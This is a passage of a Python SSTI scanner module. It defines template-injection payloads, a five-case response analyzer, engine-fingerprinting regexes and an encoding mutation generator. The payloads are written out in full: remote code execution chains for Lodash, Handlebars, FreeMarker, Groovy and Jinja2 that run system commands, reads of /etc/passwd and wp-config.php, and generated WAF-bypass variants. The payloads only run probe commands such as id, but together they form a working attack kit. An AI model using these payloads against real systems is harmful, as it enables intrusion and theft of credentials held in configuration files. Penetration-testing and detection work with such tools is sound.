        '{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}'
        '{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id"]}}{{a.stdio=[w,w]}}'
        '{{process.binding("spawn_sync").spawn(a).output}}',
        'lodash', 'Lodash spawn_sync RCE'),

    # --- Handlebars (JavaScript) ---
    _rce_entry(
        '{{#with "s" as |string|}}'
        '{{#with "e"}}'
        '{{#with split as |conslist|}}'
        '{{this.pop}}'
        '{{this.push (lookup string.sub "constructor")}}'
        '{{this.pop}}'
        '{{#with string.split as |codelist|}}'
        '{{this.pop}}'
        "{{this.push \"return require('child_process').execSync('id');\"}}"
        '{{this.pop}}'
        '{{#each conslist}}'
        '{{#with (string.sub.apply 0 codelist)}}'
        '{{this}}'
        '{{/with}}'
        '{{/each}}'
        '{{/with}}'
        '{{/with}}'
        '{{/with}}'
        '{{/with}}',
        'handlebars', 'Handlebars prototype chain RCE'),
]


# ---------------------------------------------------------------------------
# PHASE 4: FILTER BYPASS — WAF evasion variants
# ---------------------------------------------------------------------------

BYPASS_PAYLOADS = [
    # --- Jinja2 attr() filter bypass (bypass _ and . filters) ---
    _rce_entry(
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')"
        "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')"
        "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')"
        "|attr('popen')('id')|attr('read')()}}",
        'jinja2', 'Jinja2 hex escape filter bypass (SecGus)'),
    {
        'payload': '{{request|attr("__class__")}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.FILTER_BYPASS,
        'expected': None,
        'expected_re': r"<class\s+'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 attr() class access',
    },
    {
        'payload': '{{request.__class__}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.FILTER_BYPASS,
        'expected': None,
        'expected_re': r"<class\s+'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 direct __class__ access',
    },
    {
        'payload': '{{request|attr(["_"*2,"class","_"*2]|join)}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.FILTER_BYPASS,
        'expected': None,
        'expected_re': r"<class\s+'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 bypass _ filter with join',
    },
    {
        'payload': '{{request|attr(["__","class","__"]|join)}}',
        'engine': 'jinja2',
        'phase': SSTIPhase.FILTER_BYPASS,
        'expected': None,
        'expected_re': r"<class\s+'",
        'needs_baseline': False,
        'unique': True,
        'description': 'Jinja2 bypass with string join',
    },

    # --- Twig file reading ---
    {
        'payload': "{{'/etc/passwd'|file_excerpt(1,30)}}",
        'engine': 'twig',
        'phase': SSTIPhase.FILTER_BYPASS,
        'expected': None,
        'expected_re': r'root:.*:0:0:',
        'needs_baseline': False,
        'unique': True,
        'description': 'Twig file_excerpt /etc/passwd',
    },
    _rce_entry(
        "{{include('wp-config.php')}}",
        'twig', 'Twig include() file read'),

    # --- FreeMarker sandbox bypass (< 2.3.30) ---
    _rce_entry(
        '<#assign classloader=article.class.protectionDomain.classLoader>'
        '<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>'
        '<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>'
        '<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>'
        '${dwf.newInstance(ec,null)("id")}',
        'freemarker', 'FreeMarker sandbox bypass (< 2.3.30)'),

    # --- Groovy sandbox bypass ---
    _rce_entry(
        '${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")}) def x }',
        'groovy', 'Groovy ASTTest sandbox bypass'),
]


# ---------------------------------------------------------------------------
# COMBINED ACCESS
# ---------------------------------------------------------------------------

ALL_PAYLOADS = DETECTION_PAYLOADS + INFO_PAYLOADS + RCE_PAYLOADS + BYPASS_PAYLOADS


def get_payloads(
    engine: Optional[str] = None,
    phase: Optional[SSTIPhase] = None,
) -> List[Dict]:
    """Get payloads filtered by engine and/or phase."""
    results = ALL_PAYLOADS
    if engine:
        results = [p for p in results if p['engine'] == engine or p['engine'] == 'polyglot']
    if phase:
        results = [p for p in results if p['phase'] == phase]
    return results


def get_detection_payloads(engine: Optional[str] = None) -> List[Dict]:
    """Get safe detection probes, optionally filtered by engine."""
    return get_payloads(engine=engine, phase=SSTIPhase.DETECTION)


def get_payload_strings(
    engine: Optional[str] = None,
    phase: Optional[SSTIPhase] = None,
) -> List[str]:
    """Get just the payload strings (for backward compatibility with wordlists)."""
    return [p['payload'] for p in get_payloads(engine, phase)]


def get_engines() -> List[str]:
    """Get all supported engine names."""
    return sorted(set(p['engine'] for p in ALL_PAYLOADS))


# =============================================================================
# 5-CASE RESPONSE ANALYZER
# =============================================================================

# Delimiter patterns for partial processing detection (Case D)
_DELIMITERS = {
    '{{': '}}',
    '${': '}',
    '#{': '}',
    '<%': '%>',
    '[%': '%]',
    '[[': ']]',
    '{%': '%}',
    '@(': ')',
    '*{': '}',
    '[=': ']',
}

# HTML-encoded variants for Case E detection
_ENCODED_PATTERNS = [
    (re.compile(r'&lt;%|&#60;%'), '<%'),
    (re.compile(r'%7B%7B|%24%7B'), 'url_encoded_delimiters'),
    (re.compile(r'\{\{.*\}\}'), 'double_curly'),  # reflected but possibly processed
]


def check_ssti_response(
    payload_entry: Dict,
    response_text: str,
    payload_sent: str,
    baseline_response: Optional[str] = None,
) -> SSTICheckResult:
    """
    5-case SSTI response analysis.

    Args:
        payload_entry: structured payload dict from this module
        response_text: HTTP response body
        payload_sent: the actual payload string that was sent
        baseline_response: clean response (no payload) for comparison

    Returns:
        SSTICheckResult
    """
    engine = payload_entry['engine']
    phase = payload_entry['phase']

    # ===== CASE C: Check expected result FIRST (strongest signal) =====
    confirmed, conf_evidence = _check_expected(payload_entry, response_text, baseline_response)
    if confirmed:
        return SSTICheckResult(
            case=SSTICase.CONFIRMED,
            confidence=confirmed,
            evidence=conf_evidence,
            engine=engine,
        )

    # For RCE payloads, also check shared RCE output patterns
    if phase in (SSTIPhase.RCE, SSTIPhase.FILTER_BYPASS):
        for rce_re in _RCE_PATTERNS:
            if rce_re.search(response_text):
                if not baseline_response or not rce_re.search(baseline_response):
                    return SSTICheckResult(
                        case=SSTICase.CONFIRMED,
                        confidence=0.98,
                        evidence=f"RCE output detected: {rce_re.pattern[:50]}",
                        engine=engine,
                    )

    # For Mako os.system() payloads: check for return code "0"
    # (os.system returns exit code, not command output)
    if engine == 'mako' and phase == SSTIPhase.RCE:
        if '.os.system(' in payload_sent:
            # Check if payload was NOT reflected but "0" appeared
            if payload_sent not in response_text:
                if '0' in response_text:
                    if not baseline_response or _count_occurrences('0', response_text) > _count_occurrences('0', baseline_response or ''):
                        return SSTICheckResult(
                            case=SSTICase.CONFIRMED,
                            confidence=0.65,
                            evidence="Mako os.system() returned 0 (exit code, not output)",
                            engine='mako',
                            needs_manual_check=True,
                        )

    # ===== CASE A: Payload reflected verbatim =====
    if payload_sent in response_text:
        return SSTICheckResult(
            case=SSTICase.REFLECTED,
            confidence=0.0,
            evidence="Payload reflected verbatim — template engine did not process it (possible XSS)",
            engine=None,
        )

    # ===== CASE E: Payload encoded/escaped =====
    encoded_check = _check_encoded(payload_sent, response_text)
    if encoded_check:
        return SSTICheckResult(
            case=SSTICase.ENCODED,
            confidence=0.1,
            evidence=f"Payload was encoded/escaped: {encoded_check}",
            engine=None,
            needs_manual_check=True,
        )

    # ===== CASE D: Partial processing =====
    partial_check = _check_partial(payload_sent, response_text)
    if partial_check:
        return SSTICheckResult(
            case=SSTICase.PARTIAL,
            confidence=0.5,
            evidence=f"Partial template processing: {partial_check}",
            engine=engine,
            needs_manual_check=True,
        )

    # ===== CASE B: Nothing found =====
    return SSTICheckResult(
        case=SSTICase.CLEAN,
        confidence=0.0,
        evidence="No evidence of template processing",
        engine=None,
    )


def _check_expected(
    payload_entry: Dict,
    response_text: str,
    baseline_response: Optional[str],
) -> Tuple[float, str]:
    """
    Check if the expected result is present in the response.
    Returns (confidence, evidence) or (0, '') if not found.
    """
    expected = payload_entry.get('expected')
    expected_re = payload_entry.get('expected_re')
    needs_baseline = payload_entry.get('needs_baseline', False)
    unique = payload_entry.get('unique', False)
    desc = payload_entry.get('description', '')

    # Check literal expected values
    if expected:
        values = expected if isinstance(expected, list) else [expected]
        for val in values:
            if val in response_text:
                # Unique result — no baseline needed
                if unique:
                    return 0.98, f"SSTI confirmed: {desc} — unique result '{val}' found"

                # Common result — baseline required
                if needs_baseline:
                    if baseline_response is not None and val in baseline_response:
                        continue  # Was already present, not evidence
                    if baseline_response is not None:
                        return 0.95, f"SSTI confirmed: {desc} — '{val}' is NEW vs baseline"
                    else:
                        return 0.40, f"SSTI possible: {desc} — '{val}' found (no baseline)"
                else:
                    return 0.95, f"SSTI confirmed: {desc} — '{val}' found"

    # Check regex expected patterns
    if expected_re:
        match = re.search(expected_re, response_text, re.I)
        if match:
            matched_text = match.group(0)[:80]
            if unique:
                return 0.95, f"SSTI confirmed: {desc} — pattern matched: '{matched_text}'"
            if needs_baseline:
                if baseline_response and re.search(expected_re, baseline_response, re.I):
                    return 0, ''  # Was already present
                if baseline_response:
                    return 0.90, f"SSTI confirmed: {desc} — '{matched_text}' NEW vs baseline"
                else:
                    return 0.45, f"SSTI possible: {desc} — '{matched_text}' (no baseline)"
            return 0.90, f"SSTI confirmed: {desc} — '{matched_text}'"

    return 0, ''


def _check_encoded(payload_sent: str, response_text: str) -> Optional[str]:
    """Check if the payload appears in HTML-encoded or URL-encoded form."""
    # HTML entity encoding
    html_encoded = html.escape(payload_sent)
    if html_encoded != payload_sent and html_encoded in response_text:
        return f"HTML encoded: {html_encoded[:60]}"

    # URL encoding
    url_encoded = urllib.parse.quote(payload_sent, safe='')
    if url_encoded != payload_sent and url_encoded in response_text:
        return f"URL encoded: {url_encoded[:60]}"

    # Partial HTML encoding (just angle brackets and curlies)
    partial = payload_sent.replace('<', '&lt;').replace('>', '&gt;')
    if partial != payload_sent and partial in response_text:
        return f"Partially HTML encoded: {partial[:60]}"

    # Double curly braces escaped
    escaped_curlies = payload_sent.replace('{{', '&#123;&#123;').replace('}}', '&#125;&#125;')
    if escaped_curlies != payload_sent and escaped_curlies in response_text:
        return f"Curly braces HTML-encoded"

    return None


def _check_partial(payload_sent: str, response_text: str) -> Optional[str]:
    """
    Check for partial template processing (Case D).
    E.g., {{7*7}} sent but '7*7' appears in response (delimiters consumed, expr not evaluated).
    """
    for open_delim, close_delim in _DELIMITERS.items():
        if open_delim in payload_sent and close_delim in payload_sent:
            # Extract the expression between delimiters
            start = payload_sent.find(open_delim) + len(open_delim)
            end = payload_sent.find(close_delim, start)
            if start < end:
                inner = payload_sent[start:end].strip()
                if len(inner) > 0 and inner in response_text:
                    # The inner expression is in the response but the full payload is not
                    # AND the delimiters are not in the response
                    if open_delim not in response_text:
                        return (
                            f"Delimiters '{open_delim}...{close_delim}' were consumed, "
                            f"inner expression '{inner[:40]}' reflected without evaluation"
                        )
    return None


def _count_occurrences(needle: str, haystack: str) -> int:
    """Count non-overlapping occurrences of needle in haystack."""
    return haystack.count(needle)


# =============================================================================
# TEMPLATE ENGINE ERROR PATTERNS
# Used to detect which engine is present even when math probes fail.
# =============================================================================

ENGINE_ERROR_PATTERNS = {
    'jinja2': [
        re.compile(r'jinja2\.exceptions', re.I),
        re.compile(r'UndefinedError', re.I),
        re.compile(r'TemplateSyntaxError', re.I),
        re.compile(r'TemplateNotFound', re.I),
    ],
    'twig': [
        re.compile(r'Twig[_\\]Error', re.I),
    ],
    'freemarker': [
        re.compile(r'freemarker\.', re.I),
        re.compile(r'FreeMarker', re.I),
        re.compile(r'ParseException.*freemarker', re.I),
    ],
    'velocity': [
        re.compile(r'org\.apache\.velocity', re.I),
        re.compile(r'VelocityException', re.I),
    ],
    'thymeleaf': [
        re.compile(r'thymeleaf', re.I),
        re.compile(r'TemplateProcessingException', re.I),
    ],
    'smarty': [
        re.compile(r'Smarty[_]', re.I),
        re.compile(r'SmartyCompilerException', re.I),
        re.compile(r'Smarty\s+error', re.I),
    ],
    'mako': [
        re.compile(r'mako\.exceptions', re.I),
        re.compile(r'TemplateLookupException', re.I),
    ],
    'erb': [
        re.compile(r'ERB::Util', re.I),
        re.compile(r'ActionView::Template', re.I),
    ],
    'pug': [
        re.compile(r'Pug:\s*Error', re.I),
    ],
    'django': [
        re.compile(r'TemplateSyntaxError.*django', re.I),
        re.compile(r'django\.template', re.I),
    ],
    'handlebars': [
        re.compile(r'handlebars.*error', re.I),
    ],
    'liquid': [
        re.compile(r'Liquid::SyntaxError', re.I),
        re.compile(r'DotLiquid\s+Error', re.I),
    ],
    'nunjucks': [
        re.compile(r'nunjucks.*error', re.I),
        re.compile(r'Template render error', re.I),
    ],
    'pebble': [
        re.compile(r'PebbleException', re.I),
        re.compile(r'com\.mitchellbosecke\.pebble', re.I),
    ],
    'groovy': [
        re.compile(r'groovy\.lang', re.I),
        re.compile(r'GroovyRuntimeException', re.I),
    ],
}


def detect_engine_from_error(response_text: str) -> Optional[str]:
    """Try to identify the template engine from error messages in response."""
    for engine, patterns in ENGINE_ERROR_PATTERNS.items():
        for pattern in patterns:
            if pattern.search(response_text):
                return engine
    return None


# =============================================================================
# MUTATION GENERATOR
# =============================================================================

def generate_mutations(payload_entry: Dict) -> List[Dict]:
    """
    Generate encoding/bypass mutations of a payload.
    Returns new payload entries with the same expected values.
    """
    payload = payload_entry['payload']
    mutations = []

    def _add_mutation(new_payload, desc_suffix):
        if new_payload != payload:
            m = dict(payload_entry)
            m['payload'] = new_payload
            m['description'] = f"{payload_entry['description']} ({desc_suffix})"
            m['phase'] = SSTIPhase.FILTER_BYPASS
            mutations.append(m)

    # URL encode delimiters
    for delim in ['{{', '}}', '${', '#{', '<%', '%>', '[[', ']]']:
        if delim in payload:
            encoded = urllib.parse.quote(delim, safe='')
            _add_mutation(payload.replace(delim, encoded), f'URL-encoded {delim}')

    # Double URL encode delimiters
    for delim in ['{{', '}}', '${', '#{']:
        if delim in payload:
            double = urllib.parse.quote(urllib.parse.quote(delim, safe=''), safe='')
            _add_mutation(payload.replace(delim, double), f'double URL-encoded {delim}')

    # Unicode escape underscores (Jinja2 bypass)
    if '__' in payload and '{{' in payload:
        _add_mutation(
            payload.replace('__', '\\x5f\\x5f'),
            'unicode escaped underscores',
        )

    # Whitespace variations in delimiters
    if '{{' in payload:
        _add_mutation(payload.replace('{{', '{{ ').replace('}}', ' }}'), 'spaces in delimiters')
    if '${' in payload and '}' in payload:
        _add_mutation(payload.replace('${', '${ ').replace('}', ' }', 1), 'spaces in ${} delimiters')

    # Tab character injection
    if '{{' in payload:
        _add_mutation(payload.replace('{{', '{{\t'), 'tab in delimiter')

    # Newline injection
    if '{{' in payload:
        _add_mutation(payload.replace('{{', '{{\n'), 'newline in delimiter')

    return mutations
